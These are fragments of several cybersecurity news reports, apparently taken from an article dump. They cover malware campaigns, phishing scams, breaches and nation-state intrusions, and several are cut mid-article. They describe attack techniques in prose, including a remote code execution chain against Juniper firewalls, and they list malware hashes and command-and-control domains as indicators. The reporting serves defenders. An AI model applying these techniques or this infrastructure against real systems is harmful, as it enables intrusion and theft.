favorite vendors get acquired,\" Thornton says. \"Integration always has an impact on support, account management, and the senior sponsors. It will definitely give Google Chronicle SIEM and Microsoft something to talk about with the Splunk installed base.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A initial access broker (IAB) is still running rampant despite being tracked for seven years by researchers, and despite striking up a predictable tune when it comes to the tools and tactics used to compromise organizations (and pave the way for follow-on ransomware attacks).Yet to Rafe Pilling, director of threat research for Secureworks' Counter Threat Unit, \"the thing that stood out is they are quite prolific, and consistent in their tradecraft.\"At every step of the way, Gold Melody is driven by opportunism.It begins with the targets themselves: organizations running unpatched, Internet-facing servers.Following initial intrusion, the group typically attempts to establish persistence with Jakarta Server Pages (JSP) Web shells. In one case in 2020, it used the Perl-based IHS Back-Connect backdoor.Throughout the intrusion, Gold Melody performs reconnaissance on the victim environment, using Windows or Linux commands to display information about the host machine, user, directories, and more. Then it attempts to harvest credentials, for example, by using the Mimikatz pen-testing tool.Besides Mimikatz, Gold Melody has a suite of other open source tools at its disposal — like Wget, for retrieving files from a remote server — as well as those from the cybercrime underground — like \"GOTROJ,\" a Golang-based remote access Trojan (RAT) useful in establishing persistence, performing reconnaissance, and executing arbitrary commands on a host machine.So even if Gold Melody itself doesn't strike fear into the heart, its friends will. That's why Pilling emphasizes the simple steps companies can take to snuff out the danger early, like \"patching the perimeter, your Internet facing systems — that vulnerability management piece is super important.\"And, he adds, \"in these cases, we're able to identify this activity at an early stage before it could go further. So having that kind of broad visibility across your endpoint state — across network connections, and other cloud solutions — is vital for early detection, before things get out of control.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Most (64%) said they received the fraudulent messages via email and 56% via their phone.The large share of victims refusing to report fraud may be down in part to a failure in government and law enforcement action on such crimes.Cifas CEO, Mike Haley, said scams have been surging on the back of the cost-of-living crisis.“UK consumers continue to find themselves increasingly targeted by phishing and smishing campaigns offering financial help or investment opportunities, employment scams, fake adverts for rental properties as well as purchase and delivery scams,” he explained.“So now more than ever, we need to ensure there is more, effective regulation of online platforms and recognise the serious harm that their fraudulent content is causing to consumers.”Haley added that Cifas is campaigning for stricter regulation of online platforms and welcomed the passing of the new Online Safety Bill."

Therefore, it's unclear if the malware operators are still experimenting with the final step of the attack.The botnet's operators may be enhancing the miner component or seeking buyers of subscriptions to P2PInfect, so they use the miner as a dummy for demonstration.Given the current botnet's size, spread, self-updating features, and fast expansion this month, P2PInfect is a substantial threat to keep an eye on."

      "text": " Cisco Talos researchers recently discovered a new stealthy implant dubbed HTTPSnoop that was employed in attacks against telecommunications providers in the Middle East.The HTTPSnoop backdoor supports novel techniques to interface with Windows HTTP kernel drivers and devices to listen to incoming requests for specific HTTP(S) URLs. The malicious code also enables operators to execute arbitrary code on the infected endpoint.The researchers also discovered a twin implant to HTTPSnoop tracked as “PipeSnoop,” which can accept arbitrary shellcode from a named pipe and execute it on the infected endpoint. The activity involving HTTPSnoop and PipeSnoop and associated tactics, techniques, and procedures (TTPs) of the threat actors behind it do not match a known threat group. Cisco Talos experts tracked the threat actors as “ShroudedSnooper.”The researchers also discovered both HTTPSnoop and PipeSnoop masquerading as components of Palo Alto Networks’ Cortex XDR security products.The HTTPSnoop backdoor uses low-level Windows APIs to interact directly with the HTTP device on the system. The malicious code listens for incoming requests that match specific HTTP(S) URL patterns. These requests are picked up by the backdoor that decodes the data accompanying the HTTP request to extract the shellcode and executes it on the infected endpoint.The researchers discovered three variants of the HTTPSnoop implant, which uses the same code, but listens to the requests using different URL patterns.The DLL-based variants of HTTPSnoop observed by the researchers use DLL hijacking in benign applications and services to be executed on the infected system. The researchers observed three HTTPSnoop variants, the last one in order of time used a killswitch URL.The PipeSnoop implant analyzed by Talos was created in May 2023, it is a simple backdoor that can run arbitrary shellcode payloads on the infected endpoint by reading from an IPC pipe.“The HTTP URLs used by HTTPSnoop along with the binding to the built-in Windows web server indicate that it was likely designed to work on internet-exposed web and EWS servers. PipeSnoop, however, as the name may imply, reads and writes to and from a Windows IPC pipe for its input/output (I/O) capabilities This suggests the implant is likely designed to function further within a compromised enterprise–instead of public-facing servers like HTTPSnoop — and probably is intended for use against endpoints the malware operators deem more valuable or high-priority.” continues the report.PipeSnoop likely works with an auxiliary component that serves the shellcode via the named pipe.The researchers published Indicators of Compromise (IocS) associated with this threat.\nCopyright@securityaffairs 2023 "

      "text": " Scammers are impersonating the bankruptcy claim agent for crypto lender Celsius in phishing attacks that attempt to steal funds from cryptocurrency wallets.In July 2022, crypto lender Celsius filed for bankruptcy and froze withdrawals from user accounts. Customers have since filed claims against the company, hoping to recover a portion of the funds.A recipient shared the phishing email with BleepingComputer, which claims to offer creditors a 7-day exit window to claim their frozen funds.The email says they are from \"Stretto Corporate Restructing,\" using the email address no-reply@stretto.com, as shown below.The phishing email includes a link to the website case-stretto[.]com, which redirects the recipient to the phishing site claims-stretto[.]com below. The claims-stretto[.]com domain was registered today and is hosted at a web hosting provider in the Seychelles.The legitimate Stretto site for Celsius claims is located at https://cases.stretto.com/celsius/claims/.The page prompts visitors to enter their email address to withdraw their claim, and when the submit button is pressed, it opens a WalletConnect prompt to connect your installed cryptocurrency wallet with the website.If you connect a wallet, the site will now have access to all the information stored within it, including crypto addresses, balances, activity, and the ability to suggest transactions.With this connection in place, the threat actors can attempt to drain all assets and NFTs stored within the wallet by disguising the transaction as a deposit.This phishing campaign stands out because the emails pass Sender Policy Framework (SPF) checks, which determine if an email comes from a valid email server for the sending domain.SPF performs this check by comparing the IP address of the mail server that sends the email to a list of IP addresses found in the DNS SPF record for the domain used in the 'Return-Path' mail header.In this case, the phishing email's return path is 'bounces+xxx-xx=xxx.com@em6462.stretto.com', with em6462.stretto.com having an SPF record of v=spf1 ip4:149.72.171.199 -all. This SPF record means that any emails from 149.72.171.199 should be considered valid and not marked as spam.As these phishing emails originate from 149.72.171.199, which belongs to the email marketing firm SendGrid, they pass the SPF check and are allowed for delivery.This is illustrated below (some information is redacted), where the email is successfully delivered to Gmail after passing SPF checks.A recipient of one of these phishing emails told BleepingComputer that they did not have an account at Celsius and never filed as a creditor, making it strange that they received this email.The threat actors are likely using older contact lists previously stolen through hacked cryptocurrency marketing accounts.BleepingComputer has reached out to Stretto to confirm if their SendGrid account was compromised to send these emails but has not received a reply.Unfortunately, if you have already visited one of these phishing sites and lost funds or NFTs after connecting your wallet, there is likely no way to recover your assets."

When detected, the malware will decode incoming base64-encoded data from those URLs and run it as a shellcode on the compromised host.The implant, which activates on the target system via DLL hijacking, consists of two components: the stage 2 shellcode that sets up a backdoor web server through kernel calls and its configuration.HTTPSnoop establishes a listening loop that waits for incoming HTTP requests and processes valid data upon arrival; otherwise, it returns an HTTP 302 redirect.The received shellcode is decrypted and executed, and the execution result is returned to the attackers as base64-encoded XOR-encoded blobs.The implant also ensures no URL clashes with previously configured URLs on the server.Cisco has seen three variants of HTTPSnoop, each using different URL listening patterns. The first listen for generic HTTP URL-based requests, the second for URLs imitating Microsoft Exchange Web Service, and the third for URLs emulating OfficeCore's LBS/OfficeTrack and telephony applications.These variants were sampled between April 17 and April 29, 2023, with the most recent one having the least number of URLs it listens for, likely for increased stealth.Mimicking legitimate URL patterns from Microsoft Exchange Web Services and OfficeTrack makes malicious requests nearly indistinguishable from benign traffic.Cisco first spotted the PipeSnoop implant in May 2023, acting as a backdoor that executes shellcode payloads on breached endpoints through Windows IPC (Inter-Process Communication) pipes.The analysts note that contrary to HTTPSnoop, which appears to target public-facing servers, PipeSnoop is more suited for operations deep within compromised networks.Cisco also notes that the implant needs a component that supplies the shellcode. However, its analysts haven’t been able to identify it."

Notable features include:We performed static analysis on two YouTube-themed CapraRAT APKs: 8beab9e454b5283e892aeca6bca9afb608fa8718 – yt.apk, uploaded to VirusTotal in July 2023. 83412f9d757937f2719ebd7e5f509956ab43c3ce – YouTube_052647.apk, uploaded to VirusTotal in August 2023. We also identified a third APK called Piya Sharma, the YouTube channel persona described earlier: 14110facecceb016c694f04814b5e504dc6cde61 – Piya Sharma.apk, uploaded to VirusTotal in April 2023The yt and YouTube APKs apps are disguised as YouTube, borrowing the YouTube icon.The app requests several permissions. YouTube is an interesting choice for masquerading the app: some permissions, like microphone access, make sense for recording or search features. Other permissions–like the ability to send and view SMS–are less relevant to the expected app behaviors.\nPermissions prompts during install of the weaponized YouTube appWhen the app is launched, MainActivity’s load_web method launches a WebView object to load YouTube’s website. Because this loads within the trojanized CapraRAT app’s window, the user experience is different from the native YouTube app for Android and akin to viewing the YouTube page in a mobile web browser.Because CapraRAT is a framework inserted into a variety of Android applications, the files housing malicious activity are often named and arranged differently depending on the app. The CapraRAT APKs we analyzed contain the following files:Thanks to creative spelling and naming conventions, the RAT’s configuration provides consistent static detection opportunities, with each of the following present in the samples from earlier in 2023 as well:The RAT’s core functionality is in an activity similar to the Extra_Class activity from the March 2023 samples reported by ESET. Henceforth, we call this activity TPSClient for simplicity. These files are rather large, decompiling to over 10,000 lines of Smali code. By comparison, the March versions’ equivalents have only about 8,000 lines.TPSClient contains CapraRAT’s commands, which are invoked through the run method via a series of switch statements that map the string command to a related method.TPSClient has a method check_permissions() that is not in Extra_Class. This method checks the following series of Android permissions and generates a string with a True or False result for each:Interestingly, some other older versions contain this method, suggesting that the samples may be tailored for targets or are potentially developed from different branches.In CapraRAT’s configuration file, the SERVERIP variable contains the command-and-control (C2) server address, which can be a domain, IP address, or both. The C2 port is in hexadecimal Big Endian format; the human readable port can be obtained by converting into decimal, resulting in port 14862 for yt.apk, port 18892 for YouTube_052647.apk, and port 10284 for Piya Sharma.apk.Transparent Tribe is a perennial actor with reliable habits. The relatively low operational security bar enables swift identification of their tools.The group’s decision to make a YouTube-like app is a new addition to a known trend of the group weaponizing Android applications with spyware and distributing them to targets through social media.Individuals and organizations connected to diplomatic, military, or activist matters in the India and Pakistan regions should evaluate defense against this actor and threat.Defensive and preventative measures should include:Files Hashes – SHA1\n14110facecceb016c694f04814b5e504dc6cde61 – Piya Sharma APK\n83412f9d757937f2719ebd7e5f509956ab43c3ce – CapraRAT, YouTube_052647.apk\n8beab9e454b5283e892aeca6bca9afb608fa8718 – CapraRAT, yt.apkC2 Network Communications\nnewsbizshow.net\nptzbubble.shop\nshareboxs.net95[.]111.247.73\n209[.]127.19.241Get notified when we post new content.Thanks!

It would use satellite technology to receive live feeds from games before the same content would reach legitimate bookmakers. The gang would then be able to place bets on games, knowing the results, Europol explained.The gang apparently used this tactic to target Asian and South American soccer leagues, Bundesliga games, the UEFA Nations League, the 2022 Qatar World Cup, and the ATP and ITF tennis tournaments.The group placed their bets in the names of other people, to avoid suspicion. These mules collected winnings on their behalf. The group also corrupted a trader at a major betting company in order to secure the successful validation of the bets, police claimed.Four houses were searched, and seizures included two properties, three luxury vehicles, two large satellite dishes and signal receivers, 47 bank accounts, 80 phones, cash and €13,000 in counterfeit banknotes.“Successful operations such as the one led by Spain only reaffirm our engagement in ensuring our entire suite of notices, databases and expert networks fully support police in closing these gaps.”"

Also, it misses several of the features available on the actual platform.Once the CapraRAT is up and running on the device, it performs the following actions:SentinelLabs reports that the CapraRAT variants spotted in the recent campaign feature enhancements over previously analyzed samples, indicating continuous development.Regarding the attribution, the C2 (command and control) server addresses CapraRAT communicates with are hardcoded in the app's configuration file and have been associated with past Transparent Tribe activities.Some IP addresses retrieved by SentinelLabs are linked with other RAT campaigns, though the exact relationship between the threat actors and those remains unclear.In conclusion, Transparent Tribe continues its cyber espionage activities in India and Pakistan, using its signature Android RAT, now disguised as YouTube, demonstrating evolution and adaptability.SentinelLabs observes that while the threat group's weak operational security makes their campaigns and tools easily identifiable, their continuous rollout of new apps provides them an elusive edge, consistently reaching new potential victims.Update 9/21 - A Google spokesperson has sent BleepingComputer the following comment:Based on our current detection, no apps containing this malware are found on Google Play.Google Play Protect protects users from apps known to contain this malware on Android devices with Google Play Services, even when those apps come from other sources"

This Azure feature enables data sharing in a manner described by Wiz researchers as challenging to monitor and revoke.When used correctly, Shared Access Signature (SAS) tokens offer a secure means of granting delegated access to resources within your storage account. This includes precise control over the client's data access, specifying the resources they can interact with, defining their permissions concerning these resources, and determining the duration of the SAS token's validity.\"In addition, these tokens can be configured to last effectively forever, with no upper limit on their expiry time. Therefore, using Account SAS tokens for external sharing is unsafe and should be avoided.\"The Wiz Research Team found that besides the open-source models, the internal storage account also inadvertently allowed access to 38TB worth of additional private data.The exposed data included backups of personal information belonging to Microsoft employees, including passwords for Microsoft services, secret keys, and an archive of over 30,000 internal Microsoft Teams messages originating from 359 Microsoft employees.Wiz reported the incident to MSRC on June 22nd, 2023, which revoked the SAS token to block all external access to the Azure storage account, mitigating the issue on June 24th, 2023.\"AI unlocks huge potential for tech companies.

      "text": " An estimated 12,000 Juniper SRX firewalls and EX switches are vulnerable to a fileless remote code execution flaw that attackers can exploit without authentication.However, when chained together, these vulnerabilities became a critical remote code execution flaw with a rating of 9.8.Today, VulnCheck vulnerability researcher Jacob Baines released another PoC exploit that only utilizes CVE-2023-36845, bypassing the need to upload files while still achieving remote code execution.\"We've turned a multi-step (but very good) exploit into an exploit that can be written using a single curl command and appears to affect more (older) systems.\"The impact of the identified security problem is extensive and much more severe than its \"medium\" CVSS rating suggests, and admins must take immediate action to remediate the situation.Baines says he purchased an old Juniper SRX210 firewall for testing the exploit but found his device did not have the do_fileUpload() functionality required to upload files to the device.This effectively broke watchTowr's exploit chain, causing the researcher to see if there was another way to achieve remote code execution.Baines found that you could bypass the need to upload two files on the target servers by manipulating environment variables.The Juniper firewall's Appweb web server processes user HTTP requests via stdin when running a CGI script.Exploiting this, attackers can trick the system into recognizing a pseudo \"file,\"/dev/fd/0, and by adjusting the PHPRC environment variable and the HTTP request, they can display sensitive data.Next, VulnCheck harnessed PHP's 'auto_prepend_file' and 'allow_url_include' features to run arbitrary PHP code via the data:// protocol without uploading any files.That said, the severity rating of CVE-2023-36845, which is 5.4, should now be re-evaluated to a much higher critical score due to its ability to achieve remote code execution without any other flaws.The CVE-2023-36845 vulnerability impacts the following versions of Junos OS on EX Series and SRX Series:The vendor released security updates that addressed the vulnerability on August 17, 2023. However, the low severity rating the flaw received didn't raise alarms on the impacted users, many of whom might have opted to postpone its application.VulnCheck's network scans showed 14,951 Juniper with internet-exposed web interfaces. From a sample size of 3,000 devices, Baines found that 79% were vulnerable to this RCE flaw.If that percentage is applied to all exposed devices, we may be looking at 11,800 vulnerable devices on the internet.Finally, the report mentions that Shadowserver and GreyNoise have seen attackers probing Junos OS endpoints, so hackers are already exploring the opportunity to leverage CVE-2023-36845 in attacks.Therefore, Juniper admins must apply these updates as soon as possible, as they could be used to gain initial access to corporate networks."

      "text": " The LockBit ransomware group is taking advantage of remote monitoring and management (RMM) software to spread its foothold in targeted networks.\"There's a general trend towards living off the land, where they're just avoiding malware. Period. Even for initial access,\" explains Keegan Keplinger, senior threat intelligence researcher with eSentire's Threat Response Unit. \"They want to get valid credentials, and use those legitimate credentials to get in.\"The advisory details the group's favored tactics, techniques, and procedures (TTPs), including its penchant for taking advantage of RMMs.In a February 2022 attack against a home decor manufacturer, for example, eSentire's threat researchers discovered a LockBit affiliate with admin access in an unprotected machine, attempting to establish persistence and spread to other computers via the RMM AnyDesk.\"Especially in the last year, threat actors have been pivoting to not using malware,\" Keplinger explains, referring to how hackers establish persistence, and spread between and inside of networks. \"Malware is often detected by antivirus, and if not, advanced endpoint technology. So anytime you can use either software that's already in the environment, or software that could be conceivably legitimate, some people may not even recognize that as malicious right away.\"LockBit was counting on this in a June attack against a storage materials manufacturer, which counted itself a customer of the RMM ConnectWise. In this case, the researchers speculated that the threat actor was not able to steal credentials necessary to log into the company's ConnectWise environment. So, instead, it installed its own, second instance of ConnectWise in the network.\"It's pretty brilliant, because they said: 'We already know ConnectWise is in this particular target organization. So, we'll bring our own and nobody will really notice there's another instance.'\"Organizations that enjoy the benefits of RMMs, without applying proper security controls to prevent their abuse, may expose not only themselves but also partners and customers, as LockBit's MSP breach this February demonstrates.The MSP in question had left its ConnectWise login panel exposed to the open Internet. The justification, the researchers speculated, was to make it easier for its customers' IT administrators to access the service. But with brute force, or simply by purchasing them from the Dark Web, the attackers gained the necessary credentials to break through. Within five minutes of the intrusion, LockBit began dropping its ransomware binaries on multiple endpoints.\"They pretty much can go in unfettered when they get into those tools, and they get admin credentials,\" Keplinger laments. Indeed, before it was stopped, the group had used the RMM's remote access capabilities to reach customers in manufacturing, business services, hospitality, and transportation.Companies can harden themselves against this kind of abuse by applying multi-factor authentication and strict access controls to these powerful tools. And, Keplinger adds, \"endpoint monitoring is probably the biggest differentiator that's stopping and preventing these attacks.\"\"They're very successful,\" he warns of LockBit, for those not yet convinced. \"Very pervasive, and very destructive.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A Chinese-speaking threat actor that has been skimming credit card numbers off ecommerce sites and point-of-sale service providers in the Asia/Pacific region for more than a year has begun aiming at similar targets in North and Latin America as well.In a series of attacks since at least May 2023, the adversary has exploited vulnerabilities in Web applications — including one vulnerability that China's Hafnium group has used in cyber espionage campaigns — to gain access to sites belonging to organizations across multiple industry sectors. The primary goal in these attacks is to gain access to the payment pages on these sites and drop malware for stealing card numbers belonging to people making online purchases.If the target Web service has write permissions enabled, the exploit uploads a malicious dynamic link library (DLL) to a specific directory on it. The DLL then initiates a sequence of steps that results in malware for skimming credit and debit card data being installed on the website.BlackBerry researchers have observed the threat actor using multiple separate tools for privilege escalation, as well as a remote access tool, a remote code execution exploit, a malware stager/downloader, and a tool for post-exploit activities. As is often the case with malware campaigns these days, the operator of Silent Skimmer has relied on a slew of legitimate open source tools, binaries, and scripts in many of its attacks.One indication that the threat actor behind Silent Skimmer is technically skilled is how it has readjusted its command-and-control (C2) infrastructure based on the geolocation of the victims. For the campaign, the threat actor has used virtual private servers (VPS) — often on Microsoft's Azure platform — as C2 servers for newly acquitted targets. Each C2 server is typically online for less than a week and is often located in the same region or country as the victim. For Canadian victims, for example, BlackBerry found the threat actor set up a VPS in Canada, while for US victims, the VPS servers were usually within the same state as the victim.The goal behind the tactic is to ensure that traffic to and from the compromised servers blends in with normal traffic, BlackBerry said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The malware loader 'Bumblebee' has broken its two-month vacation with a new campaign that employs new distribution techniques that abuse 4shared WebDAV services.WebDAV (Web Distributed Authoring and Versioning) is an extension of the HTTP protocol that enables clients to perform remote authoring operations such as creating, accessing, updating, and deleting web server content.Intel471's researchers report that Bumblebee's latest campaign, which started on September 7, 2023, abuses the 4shared WebDAV services to distribute the loader, accommodate the attack chain, and perform several post-infection actions.The abuse of the 4shared platform, a legitimate and well-known file-hosting services provider, helps Bumblebee operators evade blocklists and enjoy high infrastructure availability.At the same time, the WebDAV protocol gives them multiple ways to bypass behavioral detection systems and the added advantage of streamlined distribution, easy payload switching, etc.The current Bumblebee campaign relies on malspam emails that pretend to be scans, invoices, and notifications to lure recipients into downloading malicious attachments.Most attachments are Windows shortcut LNK files, but there are also some ZIP archives containing LNK files, likely a sign that the Bumblebee operators are experimenting to determine what works best.Opening the LNK file launches a series of commands on the victim's machine, starting with one to mount a WebDAV folder on a network drive using hardcoded credentials for a 4shared storage account.The analysts have also spotted an updated version of the Bumblebee malware loader being used in this campaign, which has switched from using the WebSocket protocol to TCP for command and control server (C2) communications.Additionally, the new loader has abandoned the use of hardcoded C2 addresses. It now uses a domain generation algorithm (DGA) to generate 100 domains on the \".life\" top-level domain (TLD) space upon execution.The domains are generated using a 64-bit static seed value, and Bumblebee connects to them by iterating through the created list until it finds one that resolves to an active C2 server IP address.Also, adopting DGA makes it harder to map Bumblebee's infrastructure, block its domains, and significantly disrupt its operations, adding additional complexity in implementing preventive action against the malware loader."

      "text": " Deputy Editor, Infosecurity MagazineMalicious actors have stolen more than $1m in a ‘pig butchering’ cryptocurrency scam in just three months, researchers from Sophos have found.The highly sophisticated operation used a total of 14 domains and dozens of nearly identical fraud sites, according to the investigation.The attackers utilized fake trading pools of cryptocurrency from decentralized finance (DeFi) trading applications to defraud their victims, with one individual losing $22,000 in a single week.These “liquidity pools,” which encompass various types of cryptocurrencies, enable users to make profits by trading from one cryptocurrency to another. Those who participate receive a percentage of any fee paid when a trade is made – with another account (typically the operators of the pool) given permission to access participants’ wallets to facilitate the trades.Sophos found that pig butchers are increasingly setting up such pools to siphon funds from users – ultimately emptying victims’ entire liquidity pools for themselves.Frank was contacted by ‘Vivian’ on the dating app MeetMe, who claimed to be a German woman living in Washington D.C. for work. During weeks of romantic messages, Vivian made persistent attempts to convince Frank to invest in cryptocurrency, recommending a liquidity pool site.Frank eventually opened a Trust Wallet Account, enabling him to convert dollars to cryptocurrency, connecting to a link to the liquidity pool site. This was a fraudulent site impersonating decentralized finance provider Allnodes.Between May 31 and June 5, Frank invested $22,000 in the pool, and just three days later the funds were emptied by the scammers.He then turned to Vivian, who urged Frank to invest even more in the pool to recover his funds and reap the “rewards.” While waiting for his bank to authorize a money transfer to Coinbase, Frank undertook some research, finding an article on liquidity mining from Sophos, whom he contacted for help.Sean Gallagher, principal threat researcher at Sophos, told Frank to block Vivian; however, she persisted in her attempts to entice him into continuing the investment, even sending a lengthy, emotional letter that Gallagher believes was created by a generative AI app.Sophos highlighted the sophistication of this pig butchering scam operation, which didn’t even require any malware to be installed on the victim’s device, instead utilizing social engineering tactics.Gallagher noted: “This entire fake liquidity pool was run through the legitimate Trust Wallet app. At one point, Frank even tried to contact Trust Wallet’s support to recover his money, but he connected with a fake support contact from the fraudulent liquidity pool site.”Gallagher warned that pig butchering scams, also known as shā zhū pán, are growing in prevalence and are proving highly effective for threat actors.“Very few understand how legitimate cryptocurrency trading works, so it's easy for these scammers to con their targets. There are even toolkits now for this sort of scam, making it simple for different pig butchering operations to add this type of crypto fraud to their arsenal. While last year, Sophos tracked dozens of these fraudulent ‘liquidity pool’ sites, now we’re seeing more than 500,” he noted.He urged people to be wary of anyone they have no connection with reaching out to them suddenly via any dating app or social media platform, particularly if the ‘person’ reaching out wants to move the conversation to a platform like WhatsApp and then discusses investing in cryptocurrency.Sophos has shared its findings with crypto intelligence experts Chainalysis and exchange platform Coinbase, who are continuing to investigate the extent of pig butchering scams."

In contrast, the implementation of the interactive shell appears to have been derived from Derusbi, a Linux malware.Earth Lusca remained active throughout the first half of the year, targeting key government entities focused on foreign affairs, technology, and telecommunications in Southeast Asia, Central Asia, the Balkans, and worldwide.Trend Micro reports seeing exploitation attempts for several n-day unauthenticated remote code execution flaws dated between 2019 and 2022, impacting internet-exposed endpoints.The threat actors also use the Cobalt Strike beacons to drop the SprySOCKS loader, a variant of the Linux ELF injector called \"mandibule,\" which arrives on targeted machines in the form of a file named 'libmonitor.so.2.'Trend Micro's researchers say the attackers adapted mandibule for their needs, but in a somewhat rushed manner, leaving debug messages and symbols behind.The loader runs under the name \"kworker/0:22\" to avoid detection by resembling a Linux kernel worker thread, decrypts the second-stage payload (SprySOCKS), and establishes persistence on the infected computer.The SprySOCKS backdoor uses a high-performance networking framework called 'HP-Socket' for its operation, while its TCP communications with the C2 are AES-ECB encrypted.The main backdoor functionalities of this novel malware include:The malware also generates a client ID (victim number) using the MAC address of the first listed network interface and some CPU features and then converts it to a 28-byte hexadecimal string.Trend Micro reports having sampled two versions of SprySOCKS, v1.1 and v.1.3.6, indicating active development of the malware.The recommended priority for organizations should be to apply the available security updates on public-facing server products, which, in this case, would prevent initial compromise from Earth Lusca."

Once they enter the code, the site will pretend to deposit Bitcoin into the user's wallet.For example, the scam site below pretended to deposit .34 Bitcoin into my wallet, worth approximately $9,000.However, when attempting to withdraw the free Bitcoins, you must first activate your account by depositing .005 Bitcoins, worth approximately $132. As you will never receive any bitcoins from the site, the scammers generate their revenue by stealing these \"activation\" deposits.To make matters worse, you will also be prompted to enter KYC information, which can collected by the threat actors to attempt to breach your other legitimate cryptocurrency accounts.As these scams have the potential to generate a large amount of revenue for threat actors, they will not be going away, and social media platforms will continue to be flooded with these fake giveaways.Therefore, it is essential to recognize that almost every crypto giveaway site is a scam, especially those claiming to be from Elon Musk, Tesla, SpaceX, Ark Invest, Gemini, and high-profile exchanges and celebrities that promise massive returns.If you see emails, videos, tweets, or other messages on social media promoting these giveaways, remember that any cryptocurrency you send will just be stolen with nothing in return."

      "text": " Software company Retool says the accounts of 27 cloud customers were compromised following a targeted and multi-stage social engineering attack.Retool's development platform is used to build business software by companies ranging from startups to Fortune 500 enterprises, including Amazon, Mercedes-Benz, DoorDash, NBC, Stripe, and Lyft.Snir Kodesh, Retool's head of engineering, revealed that all hijacked accounts belong to customers in the cryptocurrency industry.The breach occurred on August 27, after the attackers bypassed multiple security controls using SMS phishing and social engineering to compromise an IT employee's Okta account.The attack used a URL impersonating Retool's internal identity portal and was launched during a previously announced migration of logins to Okta.While most of the targeted employees ignored the phishing text message, one clicked the embedded phishing link that redirected to a fake login portal with a multi-factor authentication (MFA) form.After signing in, the attacker deepfaked an employee's voice and called the targeted IT team member, tricking them into providing an additional MFA code, which allowed the addition of an attacker-controlled device to the targeted employee's Okta account.Retool is blaming the success of the hack on a new feature in Google Authenticator that allows users to synchronize their 2FA codes with their Google account.This has been a long-requested feature, as you can now use your Google Authenticator 2FA codes on multiple devices, as long as they are all logged into the same account.However, Retool says that the feature is also to blame for the August breach severity as it allowed the hacker who successfully phished an employee's Google account access to all their 2FA codes used for internal services.\"This allowed them to run an account takeover attack on a specific set of customers (all in the crypto industry). (They changed emails for users and reset passwords.) After taking over their accounts, the attacker poked around some of the Retool apps.\"As Kodesh explained, while, initially, Retool had enabled MFA, the auth codes synced by Google Authenticator to the cloud led to an inadvertent transition to single-factor authentication.This shift occurred as control over the Okta account translated into control over the Google account, granting access to all One-Time Passwords (OTPs) stored within Google Authenticator.\"We strongly believe that Google should either eliminate their dark patterns in Google Authenticator (which encourages the saving of MFA codes in the cloud), or at least provide organizations with the ability to disable it.\"While Google Authenticator does promote its cloud sync feature, it is not required. If you have enabled the feature, you can deactivate it by clicking on the account circle at the top right of the app and selecting 'Use Authenticator without an account.' This will log you out of the app and delete your synchronized 2FA codes in your Google account.\"Our first priority is the safety and security of all online users, whether consumer or enterprise, and this event is another example of why we remain dedicated to improving our authentication technologies. Beyond this, we also continue to encourage the move toward safer authentication technologies as a whole, such as passkeys, which are phishing resistant,\" a Google spokesperson told BleepingComputer.Google also recommended migrating to FIDO-based tech from legacy one-time password (OTP) multi-factor authentication as a simple way to thwart similar attacks.\"Phishing and social engineering risks with legacy authentication technologies, like ones based on OTP, are why the industry is heavily investing in these FIDO-based technologies,\" the Google spokesperson said.\"While we continue to work toward these changes, we want to ensure Google Authenticator users know they have a choice whether to sync their OTPs to their Google Account, or to keep them stored only locally. In the meantime, we'll continue to work on balancing security with usability as we consider future improvements to Google Authenticator.\"After discovering the security incident, Retool revoked all internal employee authenticated sessions, including those for Okta and G Suite.It also restricted access to all 27 compromised accounts and notified all affected cloud customers, restoring all hijacked accounts to their original configurations (no on-premise customers were impacted in the incident, according to Retool).\"This meant that although an attacker had access to Retool cloud, there was nothing they could do to affect on-premise customers,\" Kodesh said.\"It's worth noting that the vast majority of our crypto and larger customers in particular use Retool on-premise.\"Retool's development platform is used to build business software by companies ranging from startups to Fortune 500 enterprises, including Amazon, Mercedes-Benz, DoorDash, NBC, Stripe, and Lyft.Threat actors increasingly use social engineering attacks targeting IT service desks or support personnel to gain initial access to corporate networks.Update: Added Google statement."

He suggests adding a visual verification step at the helpdesk for just the users with the highest access privileges would stop these cyberattacks.Bradbury says Okta will continue to work with Caesars and MGM on response and recovery, confirming Okta's role in the Caesars breach as well.\"Okta, given its centrality in many organizations' IAM strategies, is naturally an appealing target,\" Guenther says. \"The key is not to view these systems as inherently flawed, but to recognize the importance of robust security hygiene, continuous monitoring, and the rapid sharing of threat intelligence.\"The real issue isn't Okta itself, according to Aaron Painter, CEO of Nametag, a provider of helpdesk cybersecurity tools. Rather, it's simply the fact that MFA is designed to identify devices rather than people.\"This vulnerability is not unique to MGM nor Okta; it's a systemic problem with multi-factor authentication,\" Painter says. \"MFA verifies devices, not people. It lacks secure enrollment and recovery — two moments when you need to know which human is being authenticated. This is a known problem, which MFA wasn't built to address.\"This is a developing story.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Peach Sandstorm password spray campaigns enable intelligence collection at high-value targets | Microsoft Security Blog",
      "text": " Since February 2023, Microsoft has observed password spray activity against thousands of organizations carried out  by an actor we track as Peach Sandstorm (HOLMIUM). Peach Sandstorm is an Iranian nation-state threat actor who has recently pursued organizations in the satellite, defense, and pharmaceutical sectors around the globe. Based upon the profile of victim organizations targeted and the observed follow-on intrusion activity, Microsoft assesses that this initial access campaign is likely used to facilitate intelligence collection in support of Iranian state interests.In cases where Peach Sandstorm successfully authenticated to an account, Microsoft observed the group using a combination of publicly available and custom tools for discovery, persistence, and lateral movement. In a small number of intrusions, Peach Sandstorm was observed exfiltrating data from the compromised environment.Given the volume of activity, ongoing attempts to access targets of interest, and risks associated with post-compromise activity, Microsoft is reporting on this campaign to raise awareness of recent Peach Sandstorm tradecraft and empower organizations to harden their attack surfaces and defend against this activity. As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised by Peach Sandstorm and provides them with the information they need to secure their accounts.Throughout 2023, Peach Sandstorm has consistently demonstrated interest in organizations in the satellite, defense, and to a lesser extent, pharmaceutical sectors.  In the initial 